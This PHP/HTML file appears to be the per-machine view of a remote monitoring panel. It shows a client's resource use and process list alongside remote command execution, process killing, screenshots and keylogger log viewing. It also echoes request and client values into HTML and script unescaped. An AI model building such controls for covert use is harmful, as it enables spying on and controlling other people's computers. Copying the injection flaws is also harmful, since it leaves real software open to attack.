<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Record</title>

    <!-- Bootstrap -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" type="text/css" href="css/decor.css">

     
      <style>
        .actions {
          display:inline-block; border:1px solid yellow; background: green; cursor:pointer;
          padding: 5px;
        }
        .actions:hover {
          background: orange;
          color: black;
        }

      #proc td {
        width: 20px;
      }
        .block {
          border: 1px solid grey;
          width: 100%;
          padding: 5px;
          font-family: 'Courier New'; 
        }
        .blockhead {
          background: #ad2727;
          padding: 5px;
          width: 100%;
          display: block;
         
         font-size:150%;
          
          margin-bottom: 10px;
          
        }
        .blockhead img {
          max-width: 32px;
        }
        .blockbody {
         color: white;
        }

      </style>
      
     <script> 
     var lastUserAction = 0;

     setInterval(function() {
       console.log("Checking last action time... " + new Date() - lastUserAction);
      if(new Date() - lastUserAction > 5000)
        window.location.reload(true);
      }, 5000); </script>

  </head>
  <body>

<nav class="navbar navbar-inverse navbar-fixed-top">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="#"><img id="logo" src = "img/logo1.png"></a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">
        <li><a href="statistics.php">Statistics</a></li>
        <li><a href="pc.php">PC</a></li>
        <li><a href="alert.php">Alert</a></li>
        <li><a href="block.php">Block</a></li>
      </ul>


    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>


<div>
<div class="pull-right col-md-4">
<button type="button" class="screenshot btn btn-info btn-lg">
          <span class="glyphicon glyphicon-screenshot"></span> Screenshot 
        </button>
		</div>
		
    <div class="row">
        <div class="col-xs-6 col-md-2">
           
           <?php

                        $dump = file_get_contents("server/client.dump");
                        $obj = json_decode($dump, true);
                        $id = $_GET['id'];
                        //var_dump($obj);

                        echo '<div class="gallery_product col-lg-2 col-md-2 col-sm-2 col-xs-4 filter ON">';
                        echo '<img src="img/on.png" class="img-responsive"><a style="color:white;font-weight:bold" href="record.php?id=' .$id. '">'. array_values($obj)[$id]["id"] . '</a>';
                        echo '</div>';
                        
                        

                        

        ?>

        </div>
        <div class="col-xs-6 col-md-8" style="color:white">
          
         

        <br/><br/><br/><br/><br/><br/>

                        <div class="block">
                          <span class="blockhead"><img src="img/cpu.png"/>  CPU Usage</span>
                          <span class="blockbody">
                          <?php 
                          echo "CPU Usage: " . array_values($obj)[$id]["cu"]["usage"] . " %";
                          echo "<br/>";
                          echo "CPU Speed: " . array_values($obj)[$id]["cu"]["freq"] . " Ghz";
                          
                          $per0 = array_values($obj)[$id]["cu"]["usage"]; 
                          $per1 = array_values($obj)[$id]["cu"]["freq"] / 4000; 
                          ?>
                          </span>

                          <div class="progress">
                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["cu"]["usage"] ?>"
                            aria-valuemin="0" aria-valuemax="10000000000" style="width:<?php echo $per0; ?>%">
                            </div>
                          </div>
                          <div class="progress">
                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["cu"]["freq"] ?>"
                            aria-valuemin="0" aria-valuemax="10000000000" style="width:<?php echo $per1; ?>%">
                            </div>
                          </div>
                        </div>


<br/><br/><br/>

                        <div class="block">
                          <span class="blockhead"><img src="img/hdd.png"/>  Disk Usage</span>
                          <span class="blockbody">
                          <?php 
                          echo "Total: " . array_values($obj)[$id]["du"]["total"] . " Bytes";
                          echo "<br/>";
                          echo "Used: " . array_values($obj)[$id]["du"]["used"] . " Bytes";
                          $per = array_values($obj)[$id]["du"]["used"] / array_values($obj)[$id]["du"]["total"];
                          
                          ?>

                          <div class="progress">
                            <div class="progress-bar progress-bar-striped  active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["du"]["used"] ?>"
                            aria-valuemin="0" aria-valuemax="<?php echo array_values($obj)[$id]["du"]["total"] ?>" style="width:<?php echo $per*100; ?>%">
                            </div>
                          </div>

                          </span>
                          
                        </div>
                        <br/><br/><br/>
                        <div class="block">
                          <span class="blockhead"><img src="img/ram.png"/>  Memory Usage</span>
                          <span class="blockbody">
                          <?php 
                          echo "Total: " . array_values($obj)[$id]["mu"]["total"] . " Bytes";
                          echo "<br/>";
                          echo "Available: " . array_values($obj)[$id]["mu"]["available"] . " Bytes";
                          echo "<br/>";
                          echo "Used: " . array_values($obj)[$id]["mu"]["used"] . " Bytes";
                          
                          $per = array_values($obj)[$id]["mu"]["used"] / array_values($obj)[$id]["mu"]["total"];
                          ?>

                          <div class="progress">
                            <div class="progress-bar progress-bar-striped  active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["mu"]["used"] ?>"
                            aria-valuemin="0" aria-valuemax="<?php echo array_values($obj)[$id]["mu"]["total"] ?>" style="width:<?php echo $per*100; ?>%">
                            </div>
                          </div>

                          </span>
                        </div>
                        <br/><br/><br/>
                        <div class="block">
                          <span class="blockhead"><img src="img/net.png"/>Wi-Fi  Network Usage</span>
                          <span class="blockbody">
                          <?php 
                          echo "Bytes Sent: " . array_values($obj)[$id]["nu"]["sent"] . " Bytes";
                          echo "<br/>";
                          echo "Bytes received: " . array_values($obj)[$id]["nu"]["received"] . " Bytes";
                          
                          $per0 = array_values($obj)[$id]["nu"]["sent"] / 10000000; 
                          $per1 = array_values($obj)[$id]["nu"]["received"] / 10000000; 
                          ?>
                          </span>

                          <div class="progress">
                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["nu"]["sent"] ?>"
                            aria-valuemin="0" aria-valuemax="1000000000" style="width:<?php echo $per0; ?>%">
                            </div>
                          </div>
                          <div class="progress">
                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["nu"]["received"] ?>"
                            aria-valuemin="0" aria-valuemax="1000000000" style="width:<?php echo $per1; ?>%">
                            </div>
                          </div>
                        </div>

                        <br/><br/><br/>
                        <div class="block">
                          <span class="blockhead"><img src="img/net.png"/>Ethernet Network Usage</span>
                          <span class="blockbody">
                          <?php 
                          echo "Bytes Sent: " . array_values($obj)[$id]["enu"]["sent"] . " Bytes";
                          echo "<br/>";
                          echo "Bytes received: " . array_values($obj)[$id]["enu"]["received"] . " Bytes";
                          
                          $per0 = array_values($obj)[$id]["enu"]["sent"] / 10000000; 
                          $per1 = array_values($obj)[$id]["enu"]["received"] / 10000000; 
                          ?>
                          </span>

                          <div class="progress">
                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["enu"]["sent"] ?>"
                            aria-valuemin="0" aria-valuemax="1000000000" style="width:<?php echo $per0; ?>%">
                            </div>
                          </div>
                          <div class="progress">
                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["enu"]["received"] ?>"
                            aria-valuemin="0" aria-valuemax="1000000000" style="width:<?php echo $per1; ?>%">
                            </div>
                          </div>
                        </div>

                        <br/><br/><br/>
                        <div class="block">
                          <span class="blockhead"><img src="img/net.png"/>  Remote Command Execution</span>
                          <span class="blockbody" style="width:100%">
                            <input style="color:white;width:100%" id="spawner" placeholder="Enter a command to execute on the remote computer..." ></input>
                          </span>

                          
                        </div>

                        <br/><br/><br/>
                        <div class="block">
                          <span class="blockhead"><img src="img/alert.png"/>  Send Alert/Message</span>
                          <span class="blockbody" style="width:100%">
                            <input style="color:black;width:100%" id="messagesender" placeholder="Enter a message to send to the remote computer..." ></input>
                          </span>

                          
                        </div>

                         <br/><br/><br/>
                        <div class="block">
                          <span class="blockhead"><img src="img/act.png"/>  Remote Actions</span>
                          <span class="blockbody" style="width:100%">
                            <div class='actions' id="takescreenshotbutton">Take a screenshot</div>
                            <div class='actions' id="monitoroffbutton">Turn off monitor</div>
                            <div class='actions' id="keyloggerviewbutton">View Keylogger logs</div>
                          </span>

                          
                        </div>


                        <br/><br/><br/>
                        <div class="block">
                          <span class="blockhead"><img src="img/ram.png"/>  Running Processes</span>
                          <span class="blockbody">
                            <table id="proc"><tr><td>Action</td><td>pid</td><td>path</td><!--<td>hash</td>--></tr>
                          <?php 
                          
                          for($i = 0; $i < count(array_values($obj)[$id]['pr']); $i++) {

                            if(!isset(array_values($obj)[$id]['pr'][$i]['hash'])) continue;
                            echo "<tr>";

                             echo "<th>";
                             echo "<button class='killer' style='background:red; color:white; border: 1px solid white; border-radius:5px' data-pid='" . array_values($obj)[$id]['pr'][$i]['pid'] . "'>Kill</button>";
                             echo "</th>";


                             echo "<th>";
                             echo array_values($obj)[$id]['pr'][$i]['pid'];
                             echo "</th>";

                             echo "<th>";
                             echo array_values($obj)[$id]['pr'][$i]['path'];
                             echo "</th>";

                             echo "<th>";
                             echo array_values($obj)[$id]['pr'][$i]['hash'];
                             echo "</th>";
                            echo "</tr>";

                          }
                         
                          ?>
                          </table>
                          </span>

                        
                        </div>


        </div>
        <div class="col-xs-6 col-md-2">

        </div>

    </div>

</div>

    <script>
    
    
    <?php 
    $pccount = $_GET['id'];
    //$dump = file_get_contents("server/client.dump");
    //$obj = json_decode($dump, true);
    $pcname =  array_values($obj)[$pccount]["id"];
    $ipaddr =  array_values($obj)[$pccount]["ip"];
    ?>

    var pcid = <?php echo $pccount; ?>;
    var pcname = "<?php echo $pcname; ?>";
    var pcip = "<?php echo $ipaddr; ?>";
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.3/socket.io.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/killer.js"></script>
	<script src="js/ss.js"></script>
    <script>
        require('./js/renderer.js')
    </script>

  </body>
</html>
